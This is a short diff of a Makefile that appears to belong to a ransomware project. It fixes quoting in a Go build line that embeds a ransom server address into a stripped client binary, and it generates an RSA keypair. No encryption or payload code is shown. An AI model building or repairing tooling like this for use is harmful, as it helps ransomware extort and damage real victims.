@@ -2,7 +2,7 @@ RANSOM_SERVER=http://localhost:8081
 
 build:
 	go build -ldflags "-s -w" -trimpath ./server
-	go build -ldflags "-s -w -X 'main.ransomServer="$(RANSOM_SERVER)" -trimpath ./client
+	go build -ldflags "-s -w -X 'main.ransomServer=$(RANSOM_SERVER)'" -trimpath ./client
 
 generate_keys:
 	openssl genrsa -out keypair.pem 8192
